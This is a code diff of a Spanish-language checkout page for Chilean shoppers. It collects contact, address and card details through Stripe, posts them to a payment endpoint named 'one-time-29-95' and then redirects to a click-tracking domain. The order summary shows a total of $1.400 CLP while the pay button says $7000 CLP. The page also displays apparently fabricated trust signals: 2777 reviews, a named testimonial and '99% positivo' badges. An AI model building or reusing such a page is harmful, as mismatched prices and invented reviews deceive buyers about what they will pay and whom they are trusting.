@@ -49,187 +49,278 @@
       width:100%;border:1px solid #cfd6e4;border-radius:10px;
       padding:12px;font-size:15px;background:#fff
     }
+
     .btn{
       width:100%;padding:12px;border:none;border-radius:12px;
-      background:#16a34a;color:#fff;font-weight:900;font-size:17px;
-      cursor:pointer;margin-top:14px;transition:opacity .2s
+      background:#16a34a;color:#fff;font-weight:900;cursor:pointer
     }
-    .btn:active{opacity:.8}
 
-    .summary-row{display:flex;justify-content:space-between;margin:8px 0;font-size:15px}
-    .total{font-weight:900;font-size:20px;margin-top:14px;border-top:1px solid var(--line);padding-top:14px}
-
-    #loading-overlay{
-      position:fixed;inset:0;background:rgba(255,255,255,.9);
-      display:flex;align-items:center;justify-content:center;
-      z-index:9999;visibility:hidden;opacity:0;transition:opacity .3s
+    .err{
+      display:none;background:#fff1f1;border:1px solid #f5bcbc;
+      padding:10px;border-radius:10px;margin-top:10px;color:#9a1a1a
     }
-    #loading-overlay[aria-hidden="false"]{visibility:visible;opacity:1}
+    .err[aria-hidden="false"]{display:block}
 
-    .badge-row{display:flex;gap:10px;margin-top:14px;opacity:.6;justify-content:center}
-    .badge-row img{height:20px}
+    .widget{
+      background:#fff;border:1px solid var(--line);
+      padding:16px;border-radius:12px
+    }
+    .widget + .widget{margin-top:12px}
+
+    .order-row{
+      display:flex;justify-content:space-between;
+      padding:6px 0;border-top:1px dashed #e6eaf1
+    }
+
+    .delivery{
+      display:flex;gap:12px;padding:12px;
+      border:1px dashed #d9e2ef;border-radius:10px;background:#f7fbff
+    }
+
+    .trust{
+      display:grid;grid-template-columns:1fr 1fr 1fr;gap:12px;text-align:center
+    }
+    .trust .box{border:1px solid var(--line);padding:8px;border-radius:10px}
+
+    .step{display:none}
+    .step[aria-hidden="false"]{display:block}
+
+    .loading-overlay{
+      position:fixed;inset:0;
+      background:rgba(246,249,252,.92);
+      display:none;align-items:center;justify-content:center;
+      z-index:9999;
+    }
+    .loading-overlay[aria-hidden="false"]{display:flex}
+
+    .loading-box{
+      width:min(92vw,460px);
+      background:#fff;
+      border:1px solid #e6edf5;
+      border-radius:14px;
+      padding:24px;
+      text-align:center;
+      box-shadow:0 6px 18px rgba(0,0,0,0.06);
+    }
+    .loading-title{
+      font-size:20px;font-weight:800;margin-bottom:18px
+    }
+    .progress-wrap{
+      width:100%;height:12px;background:#ecf1f8;
+      border-radius:999px;overflow:hidden
+    }
+    .progress-bar{
+      width:0%;height:100%;
+      background:linear-gradient(90deg,#7aa3ff,#2dd4bf);
+      animation:loadingBar 2.2s ease-in-out infinite
+    }
+    @keyframes loadingBar{
+      0%{width:0%}
+      60%{width:80%}
+      100%{width:100%}
+    }
   </style>
-
-  <script src="https://js.stripe.com/v3/"></script>
 </head>
+
 <body>
 
-  <div class="safe">✓ Conexión segura y cifrada (SSL)</div>
+<div class="safe">Pago seguro con SSL</div>
 
-  <div class="wrap">
-    <div class="page-title">
-      <span>Confirmar pedido</span>
-      <div style="display:flex;flex-direction:column;justify-content:center">
-        <div class="stars">★★★★★</div>
-        <div class="reviews">4.9/5 basado en 1,240 reseñas</div>
-      </div>
-    </div>
+<div class="wrap">
+  <div class="page-title">
+    Pago Seguro 🔒 <span class="stars">★★★★★</span>
+    <span class="reviews">(2777 reseñas)</span>
+  </div>
 
-    <div class="grid">
-      <div class="left">
-        <div class="card">
-          <div class="h2">Información de contacto</div>
+  <div class="grid">
+    <div class="card">
+      <section id="step1" class="step" aria-hidden="false">
+        <div class="h2">1. Información de envío</div>
+
+        <div class="form-grid">
+          <input id="firstName" class="input" placeholder="Nombre">
+          <input id="lastName" class="input" placeholder="Apellido">
+        </div>
+
+        <div class="form-grid">
+          <input id="billingStreet" class="input" placeholder="Dirección" style="grid-column:1/-1">
+          <input id="billingPostcode" class="input" placeholder="Código postal">
+          <input id="billingCity" class="input" placeholder="Ciudad">
+        </div>
+
+        <div class="form-grid">
+          <input id="emailInput" class="input" type="email" placeholder="Correo electrónico">
+          <input class="input" value="Chile" disabled>
+        </div>
+
+        <div class="form-grid">
+          <select id="phonePrefix" class="select">
+            <option value="+56">+56 — Chile</option>
+          </select>
+          <input id="phoneNumber" class="input" placeholder="Número de teléfono">
+        </div>
+
+        <button id="nextBtn" class="btn" style="margin-top:20px">Continuar al pago</button>
+      </section>
+
+      <section id="step2" class="step" aria-hidden="true">
+        <div class="h2">2. Información de pago</div>
+        <p class="sub">Transacción segura y cifrada por Stripe.</p>
+
+        <div style="margin-top:20px">
+          <div id="card-number" class="el" style="margin-bottom:10px"></div>
           <div class="form-grid">
-            <input type="text" id="full-name" class="input" placeholder="Nombre completo">
-            <input type="email" id="email" class="input" placeholder="Correo electrónico">
+            <div id="card-expiry" class="el"></div>
+            <div id="card-cvc" class="el"></div>
           </div>
+        </div>
 
-          <div class="h2" style="margin-top:24px">Dirección de facturación</div>
-          <div style="display:grid;gap:10px">
-            <input type="text" id="billing-street" class="input" placeholder="Calle y número">
-            <div class="form-grid">
-              <input type="text" id="billing-city" class="input" placeholder="Ciudad">
-              <input type="text" id="billing-postcode" class="input" placeholder="Código Postal">
-            </div>
+        <div id="err" class="err" aria-hidden="true"></div>
+
+        <div style="display:flex;gap:10px;margin-top:20px">
+          <button id="backBtn" class="btn" style="width:40%; background:#94a3b8">← Volver</button>
+          <button id="payNow" class="btn" style="width:60%">Pagar $7000 CLP</button>
+        </div>
+      </section>
+    </div>
+
+    <aside>
+      <div class="widget">
+        <div style="text-align:center;font-weight:800">Lo que dicen nuestros clientes</div>
+        <div style="text-align:center;font-weight:700;margin-top:10px">Fenella Lara</div>
+        <div style="text-align:center;color:#f6b80c;">★★★★★</div>
+        <p style="text-align:center; font-size:14px">"¡Recibí mi producto ayer. Excelente experiencia, la calidad es mucho mejor de lo que esperaba!"</p>
+      </div>
+
+      <div class="widget">
+        <div class="delivery">
+          <div>
+            <div style="font-weight:800">Entrega rápida</div>
+            <div class="sub">3–5 días hábiles</div>
           </div>
+          <div style="margin-left:auto;font-weight:800">Gratis</div>
+        </div>
 
-          <div class="h2" style="margin-top:24px">Teléfono</div>
-          <div style="display:flex;gap:6px">
-            <select id="phone-prefix" class="select" style="width:100px">
-              <option value="+56">+56 (CL)</option>
-            </select>
-            <input type="tel" id="phone-number" class="input" placeholder="Número de celular">
-          </div>
-
-          <div class="h2" style="margin-top:24px">Información de pago</div>
-          <div id="card-element" class="el"></div>
-          <div id="card-errors" style="color:#df1b41;font-size:13px;margin-top:8px"></div>
-
-          <button id="pay-button" class="btn">Pagar ahora $7000 CLP</button>
-
-          <div class="badge-row">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/5/5e/Visa_Inc._logo.svg" alt="Visa">
-            <img src="https://upload.wikimedia.org/wikipedia/commons/2/2a/Mastercard-logo.svg" alt="Mastercard">
-          </div>
+        <div style="margin-top:14px;font-weight:800">Resumen del pedido</div>
+        <div class="order-row"><span>Producto</span><span>$1.400 CLP</span></div>
+        <div class="order-row"><span>Envío</span><span style="color:#16a34a">Gratis</span></div>
+        <div class="order-row" style="font-weight:900; font-size:18px; border-top: 1px solid #000; margin-top:10px">
+          <span>Total</span><span>$1.400 CLP</span>
         </div>
       </div>
 
-      <div class="right">
-        <div class="card">
-          <div class="h2">Resumen de compra</div>
-          <div class="summary-row">
-            <span>Subtotal</span>
-            <span>$1.400 CLP</span>
-          </div>
-          <div class="summary-row">
-            <span>Envío</span>
-            <span style="color:#16a34a;font-weight:bold">GRATIS</span>
-          </div>
-          <div class="summary-row total">
-            <span>Total</span>
-            <span>$1.400 CLP</span>
-          </div>
-          <p class="sub" style="margin-top:14px">Los impuestos están incluidos en el precio total.</p>
+      <div class="widget">
+        <div style="font-weight:800;margin-bottom:10px">Compra garantizada</div>
+        <div class="trust">
+          <div class="box"><div>⭐</div><div style="font-size:11px">99% positivo</div></div>
+          <div class="box"><div>🔒</div><div style="font-size:11px">SSL Seguro</div></div>
+          <div class="box"><div>🛡️</div><div style="font-size:11px">Garantía</div></div>
         </div>
       </div>
-    </div>
+    </aside>
   </div>
+</div>
 
-  <div id="loading-overlay" aria-hidden="true">
-    <div style="text-align:center">
-      <div style="border:4px solid #f3f3f3;border-top:4px solid #16a34a;border-radius:50%;width:40px;height:40px;animation:spin 1s linear infinite;margin:0 auto"></div>
-      <p style="margin-top:14px;font-weight:bold">Procesando pago...</p>
-    </div>
+<div id="loading-overlay" class="loading-overlay" aria-hidden="true">
+  <div class="loading-box">
+    <div class="loading-title">Procesando pago…</div>
+    <div class="progress-wrap"><div class="progress-bar"></div></div>
+    <p class="sub" style="margin-top:10px">Por favor no cierre esta ventana…</p>
   </div>
+</div>
 
-  <style>
-    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-  </style>
+<script src="https://js.stripe.com/v3/"></script>
+<script>
+window.addEventListener('DOMContentLoaded', () => {
+  const qs = new URLSearchParams(window.location.search);
 
-  <script>
-    const stripe = Stripe('pk_live_51P0O7K2M6fKzLp0Z...'); 
-    const elements = stripe.elements();
-    const cardNumber = elements.create('card', {
-      style: {
-        base: { fontSize: '16px', color: '#0a2540', '::placeholder': { color: '#aab7c4' } }
+  // Lógica de prellenado (Prefill)
+  try {
+    if (qs.get('sub3')) document.getElementById('firstName').value = decodeURIComponent(qs.get('sub3'));
+    if (qs.get('sub4')) document.getElementById('lastName').value = decodeURIComponent(qs.get('sub4'));
+    if (qs.get('sub5')) document.getElementById('billingStreet').value = decodeURIComponent(qs.get('sub5'));
+    if (qs.get('sub7')) document.getElementById('billingCity').value = decodeURIComponent(qs.get('sub7'));
+    if (qs.get('sub9')) document.getElementById('emailInput').value = decodeURIComponent(qs.get('sub9'));
+    if (qs.get('sub10')) document.getElementById('phoneNumber').value = decodeURIComponent(qs.get('sub10'));
+  } catch(e) {}
+
+  const stripe = Stripe("pk_live_51P0O7K2M6fKzLp0Z..."); 
+  const elements = stripe.elements();
+
+  const cardNumber = elements.create('cardNumber');
+  const cardExpiry = elements.create('cardExpiry');
+  const cardCvc = elements.create('cardCvc');
+
+  cardNumber.mount('#card-number');
+  cardExpiry.mount('#card-expiry');
+  cardCvc.mount('#card-cvc');
+
+  // Navegación
+  document.getElementById('nextBtn').onclick = () => {
+    document.getElementById('step1').setAttribute('aria-hidden','true');
+    document.getElementById('step2').setAttribute('aria-hidden','false');
+  };
+
+  document.getElementById('backBtn').onclick = () => {
+    document.getElementById('step2').setAttribute('aria-hidden','true');
+    document.getElementById('step1').setAttribute('aria-hidden','false');
+  };
+
+  document.getElementById('payNow').onclick = async () => {
+    const payBtn = document.getElementById('payNow');
+    const errBox = document.getElementById('err');
+    const overlay = document.getElementById("loading-overlay");
+
+    payBtn.disabled = true;
+    errBox.setAttribute("aria-hidden","true");
+    overlay.setAttribute("aria-hidden","false");
+
+    const billingDetails = {
+      name: document.getElementById('firstName').value + " " + document.getElementById('lastName').value,
+      email: document.getElementById('emailInput').value,
+      phone: document.getElementById('phonePrefix').value + document.getElementById('phoneNumber').value,
+      address: {
+        line1: document.getElementById('billingStreet').value,
+        city: document.getElementById('billingCity').value,
+        postal_code: document.getElementById('billingPostcode').value,
+        country: "CL"
       }
-    });
-    cardNumber.mount('#card-element');
+    };
 
-    const urlParams = new URLSearchParams(window.location.search);
-    const nameInput = document.getElementById("full-name");
-    const emailInput = document.getElementById("email");
-    const billingStreet = document.getElementById("billing-street");
-    const billingCity = document.getElementById("billing-city");
-    const billingPostcode = document.getElementById("billing-postcode");
-    const phonePrefix = document.getElementById("phone-prefix");
-    const phoneNumber = document.getElementById("phone-number");
+    try {
+      const pm = await stripe.createPaymentMethod({
+        type: "card",
+        card: cardNumber,
+        billing_details: billingDetails
+      });
+      if (pm.error) throw pm.error;
 
-    if (urlParams.get("name")) nameInput.value = urlParams.get("name");
-    if (urlParams.get("email")) emailInput.value = urlParams.get("email");
-    if (urlParams.get("address")) billingStreet.value = urlParams.get("address");
-    if (urlParams.get("city")) billingCity.value = urlParams.get("city");
-    if (urlParams.get("zip")) billingPostcode.value = urlParams.get("zip");
-    if (urlParams.get("phone")) phoneNumber.value = urlParams.get("phone");
+      const r = await fetch("/api/stripe/s3/one-time-29-95", {
+        method:"POST",
+        headers:{ "Content-Type":"application/json" },
+        body:JSON.stringify({
+          paymentMethodId: pm.paymentMethod.id,
+          billingDetails
+        })
+      });
 
-    const payBtn = document.getElementById("pay-button");
-    payBtn.addEventListener("click", async () => {
-      const overlay = document.getElementById("loading-overlay");
-      overlay.setAttribute("aria-hidden","false");
+      const d = await r.json();
+      const c = await stripe.confirmCardPayment(d.clientSecret,{
+        payment_method: pm.paymentMethod.id
+      });
 
-      const billingDetails = {
-        name: nameInput.value,
-        email: emailInput.value,
-        phone: phonePrefix.value + phoneNumber.value,
-        address: {
-          line1: billingStreet.value,
-          city: billingCity.value,
-          postal_code: billingPostcode.value,
-          country: "CL" 
-        }
-      };
+      if (c.error) throw c.error;
 
-      try {
-        const pm = await stripe.createPaymentMethod({
-          type: "card",
-          card: cardNumber,
-          billing_details: billingDetails
-        });
-        if (pm.error) throw pm.error;
+      window.location.href = "https://cudsr.bemobtrcks.com/go/6b6e67d8-fe22-4816-8318-ef7cf7685f83";
 
-        const r = await fetch("/api/stripe/s3/one-time-29-95", {
-          method:"POST",
-          headers:{ "Content-Type":"application/json" },
-          body:JSON.stringify({
-            paymentMethodId: pm.paymentMethod.id,
-            billingDetails
-          })
-        });
-
-        const d = await r.json();
-        const c = await stripe.confirmCardPayment(d.clientSecret,{
-          payment_method: pm.paymentMethod.id
-        });
-
-        if (c.error) throw c.error;
-
-        window.location.href = "https://cudsr.bemobtrcks.com/go/e1420adb-fbc5-4cfe-b0f1-10615c05e062";
-
-      } catch (err) {
-        overlay.setAttribute("aria-hidden","true");
-        document.getElementById("card-errors").textContent = err.message;
-      }
-    });
-  </script>
+    } catch(e){
+      errBox.textContent = e.message;
+      errBox.setAttribute("aria-hidden","false");
+      payBtn.disabled = false;
+      overlay.setAttribute("aria-hidden","true");
+    }
+  };
+});
+</script>
 </body>
 </html>
